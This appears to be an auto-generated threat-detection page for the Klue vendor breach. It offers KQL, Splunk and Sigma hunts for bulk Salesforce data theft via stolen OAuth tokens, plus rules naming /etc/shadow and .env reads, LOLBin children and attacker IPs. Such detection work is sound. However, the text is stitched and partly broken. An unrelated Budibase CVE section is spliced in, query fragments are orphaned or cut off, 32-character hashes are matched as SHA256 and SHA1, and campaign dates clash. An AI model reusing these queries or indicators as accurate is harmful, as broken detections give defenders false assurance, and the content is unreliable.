When a vendor's breach becomes yours: lessons from the Klue incident

Snyk
2026-06-23 6 use cases 3 techniques 4 kill-chain phases detected

A forgotten credential at vendor Klue let attackers reach customers' Salesforce data. How modern SaaS breaches cascade, and the keys you should audit.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Salesforce connected-app OAuth access from first-seen ISP / anonymizing proxy (stolen-token reuse) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Klue/Icarus: bulk Salesforce CRM record retrieval via connected app (Case/Contact/Account/Opportunity) · [LLM] Salesforce API access bearing python-requests/aiohttp automation user-agent (Icarus OAuth abuse) · OAuth consent / suspicious app grant
Klue/Icarus: bulk Salesforce CRM record retrieval via connected app (Case/Contact/Account/Opportunity) AIActions on Objectives Medium
Hunts the high-volume automated read/export of Salesforce CRM objects performed by the compromised Klue OAuth integration during the June 2026 Icarus/UNC6395 campaign. Article-specific because it anchors on the exact CRM objects (Case, Contact, Account, Opportunity) that were mass-queried via SOQL/bulk export by an authorized third-party connected app rather than an interactive user. Rationale: Anchors on the exact CRM objects (Case/Contact/Account/Opportunity) that Mandiant/Google Cloud confirmed were bulk-SOQL-queried and exported by the abused OAuth connected app, plus a per-hour volume threshold that separates a productized SaaS connector's steady sync from an attacker's automated mass extraction. Cross-checked against: • https://www.csoonline.com/article/4187907/klue-breach-exposed-salesforce-crm-data-through-stolen-oauth-tokens.html • https://cloud.google.com/blog/topics/threat-intelligence/data-theft-salesforce-instances-via-salesloft-drift • https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/protect-against-oauth-attacks-in-salesforce-with-microsoft-defender/4450584
ATT&CKT1119 T1213 T1567.002
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Nightly/scheduled Klue competitive-intel sync legitimately reading Account/Opportunity records
  • Sales-ops bulk report exports or Salesforce Data Loader jobs run by admins
  • Data-warehouse ETL connectors (Fivetran, Informatica, Mulesoft) extracting CRM objects on a schedule
  • SaaS backup tooling (OwnBackup/Own, Spanning) performing full-object snapshots
  • Marketing/RevOps enrichment integrations doing periodic full-table pulls
Suppression filter
| where AccountObjectId !in ("<known-klue-integration-objectid-AFTER-revalidation>") and not (UserAgents has_any ("Salesforce Data Loader","OwnBackup","Fivetran","Informatica"))
Response runbook
1) TRIAGE: Identify the AccountObjectId/CONNECTED_APP_NAME driving the spike — confirm whether it is the Klue integration service account and compare the hour's RecordOps to the prior 30-day baseline for that identity. Pull the UserAgents and SrcIPs aggregated. 2) CONTAIN: If it is Klue (or any unexpected connected app) exceeding baseline, disable/revoke the connected app's OAuth authorization in Salesforce Setup > Connected Apps OAuth Usage and revoke its tokens; do not just block the IP. 3) HUNT: Pivot on the same AccountObjectId across all Salesforce ActionTypes for the last 14 days, look for python-requests/aiohttp user-agents (UC2) and first-seen source ISPs (UC3), and enumerate exactly which records were read for breach-notification scoping.
CloudAppEvents
| where Timestamp > ago(7d)
| where Application == "Salesforce"
| where ActionType has_any ("Api","ReportExport","Report exported","Bulk","Mass","Export","Read")
| where ObjectType in~ ("Case","Contact","Account","Opportunity") or isempty(ObjectType)
| summarize RecordOps = count(),
            DistinctRecords = dcount(ObjectId),
            ObjectsTouched = make_set(ObjectType, 10),
            FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            UserAgents = make_set(UserAgent, 10),
            SrcIPs = make_set(IPAddress, 15),
            ISPs = make_set(ISP, 8)
            by AccountDisplayName, AccountObjectId, AccountType, ApplicationId, bin(Timestamp, 1h)
| where RecordOps > 1000   // bulk automated pull; productized Klue sync runs far lower, attacker mass-export spikes
| order by RecordOps desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
CloudAppEvents
| where TimeGenerated > ago(7d)
| where Application == "Salesforce"
| where ActionType has_any ("Api","ReportExport","Report exported","Bulk","Mass","Export","Read")
| where ObjectType in~ ("Case","Contact","Account","Opportunity") or isempty(ObjectType)
| summarize RecordOps = count(),
            DistinctRecords = dcount(ObjectId),
            ObjectsTouched = make_set(ObjectType, 10),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            UserAgents = make_set(UserAgent, 10),
            SrcIPs = make_set(IPAddress, 15),
            ISPs = make_set(ISP, 8)
            by AccountDisplayName, AccountObjectId, AccountType, ApplicationId, bin(TimeGenerated, 1h)
| where RecordOps > 1000   // bulk automated pull; productized Klue sync runs far lower, attacker mass-export spikes
| order by RecordOps desc
WEB
sourcetype="sfdc:reportexport" OR sourcetype="sfdc:api" OR sourcetype="sfdc:restapi" OR sourcetype="sfdc:bulkapi"
| eval crm_object=coalesce(ENTITY_NAME, ENTITY)
| where (crm_object IN ("Case","Contact","Account","Opportunity")) OR (EVENT_TYPE IN ("ReportExport","BulkApi","BulkApiV2"))
| bin _time span=1h
| stats count AS RecordOps dc(crm_object) AS DistinctObjects values(crm_object) AS Objects values(USER_AGENT) AS UserAgents dc(CLIENT_IP) AS SrcIPCount values(CLIENT_IP) AS SrcIPs by _time, USER_NAME, USER_ID, CONNECTED_APP_NAME
| where RecordOps > 1000
| sort - RecordOps
Salesforce API access bearing python-requests/aiohttp automation user-agent (Icarus OAuth abuse) AIActions on Objectives High
Detects Salesforce API/bulk calls whose user-agent is a raw Python HTTP library (python-requests, aiohttp), which Mandiant attributed to the Icarus/UNC6395 exfiltration scripts in the Klue/Salesloft-Drift OAuth campaign. Article-specific because a productized SaaS connector like Klue does not present python-requests/aiohttp as its session user-agent — that fingerprint indicates the stolen token is being driven by an attacker's ad-hoc script. Rationale: The python-requests/aiohttp user-agent is a high-fidelity, second-source-confirmed (Mandiant/Google Cloud) fingerprint of the Icarus exfil scripts driving a stolen OAuth token, and it cleanly distinguishes scripted attacker access from a legitimate productized connector's normal session UA. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/data-theft-salesforce-instances-via-salesloft-drift • https://www.rescana.com/post/salesloft-drift-oauth-token-breach-enables-salesforce-data-theft-in-unc6395-icarus-attack-campaign-august-2026
ATT&CKT1528 T1078.004 T1071.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • In-house Python integration scripts legitimately calling the Salesforce REST/Bulk API with a default user-agent
  • CI/CD jobs or scheduled data pipelines built on requests/aiohttp pulling CRM data
  • QA/sandbox automation against a production org
  • A developer running an ad-hoc simple_salesforce/requests script for a one-off pull
  • Low-code/iPaaS connector that happens to surface a python-requests UA
Suppression filter
| where AccountObjectId !in ("<known-internal-python-integration-objectid>") and AccountType != "DeveloperSandbox"
Response runbook
1) TRIAGE: Determine which AccountObjectId/CONNECTED_APP the python-requests/aiohttp sessions authenticated as — if it is an OAuth connected-app/service identity (not a named developer), treat as high priority and pull the SrcIPs and Objects accessed. 2) CONTAIN: Revoke the connected app's OAuth tokens and disable the integration in Salesforce; rotate the integration credential/secret. 3) HUNT: Correlate the same SrcIPs/AccountObjectId against UC1 (bulk record volume) and UC3 (new source infra); if confirmed, enumerate every object/record touched by those sessions for notification scope and check for log-tampering (Setup Audit Trail gaps).
CloudAppEvents
| where Timestamp > ago(7d)
| where Application == "Salesforce"
| where UserAgent has_any ("python-requests","aiohttp","python-urllib","Python/3")
| summarize EventCount = count(),
            Actions = make_set(ActionType, 12),
            Objects = make_set(ObjectType, 12),
            FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            SrcIPs = make_set(IPAddress, 15),
            ISPs = make_set(ISP, 8),
            AnonProxy = make_set(IsAnonymousProxy, 3)
            by AccountDisplayName, AccountObjectId, AccountType, UserAgent
| order by EventCount desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
CloudAppEvents
| where TimeGenerated > ago(7d)
| where Application == "Salesforce"
| where UserAgent has_any ("python-requests","aiohttp","python-urllib","Python/3")
| summarize EventCount = count(),
            Actions = make_set(ActionType, 12),
            Objects = make_set(ObjectType, 12),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            SrcIPs = make_set(IPAddress, 15),
            ISPs = make_set(ISP, 8),
            AnonProxy = make_set(IsAnonymousProxy, 3)
            by AccountDisplayName, AccountObjectId, AccountType, UserAgent
| order by EventCount desc
WEB
sourcetype="sfdc:api" OR sourcetype="sfdc:restapi" OR sourcetype="sfdc:bulkapi" OR sourcetype="sfdc:reportexport"
| where like(lower(USER_AGENT),"%python-requests%") OR like(lower(USER_AGENT),"%aiohttp%") OR like(lower(USER_AGENT),"%python-urllib%")
| stats count AS Hits values(EVENT_TYPE) AS EventTypes values(ENTITY_NAME) AS Objects dc(CLIENT_IP) AS SrcIPCount values(CLIENT_IP) AS SrcIPs min(_time) AS firstSeen max(_time) AS lastSeen by USER_NAME, USER_ID, USER_AGENT, CONNECTED_APP_NAME
| sort - Hits
Salesforce connected-app OAuth access from first-seen ISP / anonymizing proxy (stolen-token reuse) AIExploitation Medium
Surfaces Salesforce activity for a connected-app/service identity arriving from a source ISP never previously associated with that identity, or flagged as an anonymizing proxy — the signature of an attacker replaying a harvested OAuth token from their own infrastructure rather than from Klue's. Article-specific because the breach hinged on a long-lived integration token being used from attacker-controlled (proxied) infrastructure. Rationale: Replays the core breach mechanic — a long-lived OAuth/service token used from new (often anonymized) infrastructure — by leftanti-joining today's Salesforce source ISPs per identity against a 30-day baseline and prioritizing anonymous-proxy hits, which catches token theft even when API calls themselves look legitimate. Cross-checked against: • https://www.csoonline.com/article/4187907/klue-breach-exposed-salesforce-crm-data-through-stolen-oauth-tokens.html • https://cloud.google.com/blog/topics/threat-intelligence/data-theft-salesforce-instances-via-salesloft-drift
ATT&CKT1078.004 T1528 T1090.003
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Klue (or another connected app) legitimately changing its egress IP/ISP after a cloud-provider migration or scaling event
  • A traveling admin or service account routed through a new corporate VPN/egress point
  • Genuine new integration deployed in the last 24h presenting a never-before-seen ISP
  • Cloud-hosted ETL/backup tooling whose provider rotates outbound IP ranges
  • Identity using a privacy-VPN endpoint flagged as anonymous proxy but operated by an employee
Suppression filter
| where not (ISP in ("<known-klue-egress-isp>","<corp-vpn-isp>") and AnyAnonProxy == false)
Response runbook
1) TRIAGE: For each first-seen ISP/identity pair, confirm whether the AccountObjectId is a connected-app/service identity and whether the new ISP/anon-proxy is expected (check change tickets for new integrations or vendor IP changes). 2) CONTAIN: If unexplained — especially anonymous-proxy hits on the Klue integration identity — revoke the connected app's OAuth tokens, force token re-issuance, and rotate the integration secret. 3) HUNT: Join this identity+IP back to UC1 (bulk reads) and UC2 (python UAs) within the same window; if any correlate, scope all records accessed from those sessions and review the Setup Audit Trail for evidence of log clearing.
let Lookback = 30d;
let Baseline = CloudAppEvents
    | where Timestamp between (ago(Lookback) .. ago(1d))
    | where Application == "Salesforce"
    | summarize by AccountObjectId, ISP;
CloudAppEvents
| where Timestamp > ago(1d)
| where Application == "Salesforce"
| where isnotempty(AccountObjectId)
| join kind=leftanti Baseline on AccountObjectId, ISP
| summarize EventCount = count(),
            Actions = make_set(ActionType, 10),
            Objects = make_set(ObjectType, 10),
            FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            UserAgents = make_set(UserAgent, 8),
            AnyAnonProxy = max(tobool(IsAnonymousProxy))
            by AccountDisplayName, AccountObjectId, AccountType, IPAddress, ISP, CountryCode
| order by AnyAnonProxy desc, FirstSeen desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
let Lookback = 30d;
let Baseline = CloudAppEvents
    | where TimeGenerated between (ago(Lookback) .. ago(1d))
    | where Application == "Salesforce"
    | summarize by AccountObjectId, ISP;
CloudAppEvents
| where TimeGenerated > ago(1d)
| where Application == "Salesforce"
| where isnotempty(AccountObjectId)
| join kind=leftanti Baseline on AccountObjectId, ISP
| summarize EventCount = count(),
            Actions = make_set(ActionType, 10),
            Objects = make_set(ObjectType, 10),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            UserAgents = make_set(UserAgent, 8),
            AnyAnonProxy = max(tobool(IsAnonymousProxy))
            by AccountDisplayName, AccountObjectId, AccountType, IPAddress, ISP, CountryCode
| order by AnyAnonProxy desc, FirstSeen desc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) AS firstSeen max(_time) AS lastSeen from datamodel=Authentication where Authentication.app="Salesforce" earliest=-1d by Authentication.user, Authentication.src, Authentication.app
| `drop_dm_object_name(Authentication)`
| search NOT
    [| tstats `summariesonly` count from datamodel=Authentication where Authentication.app="Salesforce" earliest=-30d latest=-1d by Authentication.user, Authentication.src
     | `drop_dm_object_name(Authentication)`
     | fields user, src]
| iplocation src
| table firstSeen, lastSeen, user, app, src, City, Country, count
| sort - firstSeen
| tstats summariesonly=false count min(_time) AS firstSeen max(_time) AS lastSeen from datamodel=Authentication where Authentication.app="Salesforce" earliest=-1d by Authentication.user, Authentication.src, Authentication.app
| `drop_dm_object_name(Authentication)`
| search NOT
    [| tstats summariesonly=false count from datamodel=Authentication where Authentication.app="Salesforce" earliest=-30d latest=-1d by Authentication.user, Authentication.src
     | `drop_dm_object_name(Authentication)`
     | fields user, src]
| iplocation src
| table firstSeen, lastSeen, user, app, src, City, Country, count
| sort - firstSeen
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

title: Entra ID Consent to Third-Party OAuth Application
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d05
status: experimental
description: |
    User-driven consent to a third-party OAuth application — illicit-
    consent attack precursor. Pair with first-time-seen-app heuristic
    in your SIEM for higher fidelity.
references:
    - https://attack.mitre.org/techniques/T1528/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1528
    - attack.persistence
logsource:
    product: azure
    service: auditlogs
detection:
    selection:
        OperationName: 'Consent to application'
        Result: 'success'
    condition: selection
falsepositives:
    - Legitimate first-time SaaS app onboarding
level: medium
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Authentication.Authentication
    where Authentication.action="success"
      AND Authentication.signature IN (
        "Consent to application",
        "Add app role assignment grant to user",
        "Add OAuth2PermissionGrant",
        "Add delegated permission grant")
    by Authentication.user, Authentication.app, Authentication.src, Authentication.signature
| `drop_dm_object_name(Authentication)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Authentication.Authentication
    where Authentication.action="success"
      AND Authentication.signature IN (
        "Consent to application",
        "Add app role assignment grant to user",
        "Add OAuth2PermissionGrant",
        "Add delegated permission grant")
    by Authentication.user, Authentication.app, Authentication.src, Authentication.signature
| `drop_dm_object_name(Authentication)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("138.226.246.94", "212.86.125.24", "213.111.148.90", "94.154.32.160") or RemoteUrl has_any ("")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["138.226.246.94", "212.86.125.24", "213.111.148.90", "94.154.32.160"]);
let BadDomains = dynamic([""]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("138.226.246.94", "212.86.125.24", "213.111.148.90", "94.154.32.160")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats `summariesonly` count from datamodel=Web
        where Web.dest IN ("")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats `summariesonly` count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("")
        by DNS.src, DNS.query, DNS.answer
     | `drop_dm_object_name(DNS)`]
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.dest IN ("138.226.246.94", "212.86.125.24", "213.111.148.90", "94.154.32.160")
    by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| append
    [| tstats summariesonly=false count from datamodel=Web
        where Web.dest IN ("")
        by Web.src, Web.dest, Web.url, Web.user
     | `drop_dm_object_name(Web)`]
| append
    [| tstats summariesonly=false count from datamodel=Network_Resolution.DNS
        where DNS.query IN ("")
        by DNS.src, DNS.query, DNS.answer

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Budibase Node server reads /data/.env or /etc/shadow via symlink (CVE-2026-54352)
Budibase PWA process-zip endpoint abuse for arbitrary file read (CVE-2026-54352) AIExploitation Medium
Hunts calls to POST /api/pwa/process-zip, the workspace-builder endpoint abused by CVE-2026-54352 to upload a symlink-laden PWA zip and read arbitrary server files. This endpoint is rarely used legitimately, so enumerating callers surfaces exploitation attempts and the builder identity behind them. Rationale: Uses the exact vulnerable route string /api/pwa/process-zip from static.ts:24; the endpoint is BUILDER-authenticated and rarely called, making enumeration of callers a clean exploitation pivot. Defender/Falcon/CloudWatch left empty because web-request logs for a self-hosted Node container are not shipped to those platforms. Cross-checked against: • https://advisories.gitlab.com/npm/@budibase/server/CVE-2026-54352/ • https://www.thehackerwire.com/budibase-critical-file-read-via-symlink-following-cve-2026-54352/ • https://vulnerability.circl.lu/vuln/ghsa-w7mq-r738-x278
ATT&CKT1190 T1083
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A workspace builder legitimately uploading a real PWA icon zip
  • CI/CD or IaC pipelines provisioning Budibase apps with PWA assets
  • QA/test automation exercising the PWA-manifest feature
  • Budibase version upgrade re-processing existing PWA icons
Suppression filter
and not (HttpStatusCode in ("400","401","403") )  // failed/unauth attempts are lower priority; focus 200-family responses that actually returned an asset
Response runbook
1) Triage: pull the SrcUsername/SrcIpAddr behind the POST and the immediately-following GET /api/assets/{appId}/pwa/{uuid}.png; inspect the fetched object's size/content-type — a real icon is a small PNG, a leaked /data/.env or /etc/shadow will be plaintext of a different size. 2) Contain: if content is non-image, rotate ALL secrets in /data/.env (JWT_SECRET, INTERNAL_API_KEY, MINIO_*, REDIS_PASSWORD, COUCHDB_PASSWORD, DATABASE_URL) immediately and upgrade Budibase to >= 3.39.9; revoke the offending builder session. 3) Hunt: check for global-admin actions or session tokens minted after the leak (JWT forge with stolen JWT_SECRET) and review other apps the builder can access for the same upload.
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url has "/api/pwa/process-zip"
| project TimeGenerated, SrcIpAddr, SrcUsername, HttpMethod, Url, HttpStatusCode, UserAgent = HttpRequestHeaderUserAgent, DstHostname
| summarize Requests = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), any(UserAgent), any(HttpStatusCode) by SrcIpAddr, SrcUsername, DstHostname
| order by LastSeen desc

Budibase Node server reads /data/.env or /etc/shadow via symlink (CVE-2026-54352) AIActions on Objectives High
Alerts when the Budibase Node server process opens host-secret files (/data/.env, /etc/shadow) that its PWA icon-processing pipeline should never touch. CVE-2026-54352 turns an uploaded symlink into an fsp.open() on these paths, so a runtime read by node is the unambiguous post-exploitation signal. Rationale: Anchors on the two exact targets named in the advisory reproduction (/data/.env holding JWT_SECRET/MINIO_*/etc, and /etc/shadow reached because the default Docker image runs node as root); the icon pipeline never legitimately opens these at runtime, so a node read = exploitation. Defender left empty because MDE-for-Linux does not reliably emit file-open/read events; CloudWatch empty (non-AWS). Cross-checked against: • https://advisories.gitlab.com/npm/@budibase/server/CVE-2026-54352/ • https://www.thehackerwire.com/budibase-critical-file-read-via-symlink-following-cve-2026-54352/ • https://vulnerability.circl.lu/vuln/ghsa-w7mq-r738-x278
ATT&CKT1552.001 T1003.008 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Container boot: the Budibase node process legitimately reads /data/.env once at startup via dotenv (only affects /data/.env, never /etc/shadow)
  • A sysadmin manually cat-ing /data/.env for troubleshooting (process is bash/cat, not node — excluded by the process filter)
  • Backup/monitoring agents snapshotting /data (non-node process)
  • Security scanners or auditd baseline tools deliberately reading /etc/shadow (non-node process)
Suppression filter
| where not (TargetFilePath =~ "/data/.env" and ActingProcessCommandLine has_any ("dotenv","npm start","node server.js") and EventType =~ "FileCreated")  // suppress boot-time dotenv load; /etc/shadow reads are never suppressed
Response runbook
1) Triage: confirm the ActingProcessName is node/nodejs and the read occurred well AFTER container start (not the boot-time dotenv load); any node read of /etc/shadow is malicious with no boot exception. 2) Contain: isolate/redeploy the container, upgrade to Budibase >= 3.39.9, and rotate every secret in /data/.env plus /etc/shadow hashes; invalidate all issued JWTs since JWT_SECRET is now assumed leaked. 3) Hunt: pivot to web logs for the paired POST /api/pwa/process-zip and identify the builder account; check for forged global-admin sessions and cross-tenant access following the leak.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("node","nodejs")
| where TargetFilePath in~ ("/data/.env","/etc/shadow")
| project TimeGenerated, DvcHostname, ActingProcessName, ActingProcessCommandLine, TargetFilePath, ActorUsername, EventType
| order by TimeGenerated desc

| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c") or SHA1 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c") or MD5 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c") or SHA1 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c") or MD5 in~ ("bd501fa31bf44a7e8beb6f7b628c6def", "bf754d8f29434fc997225e10f55de778", "e9580f58b18b4371868aa3442c57522c", "c5441dc903f845bdb93a98b949a612b2", "50739fb539504149a5fd85c85fe6750c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
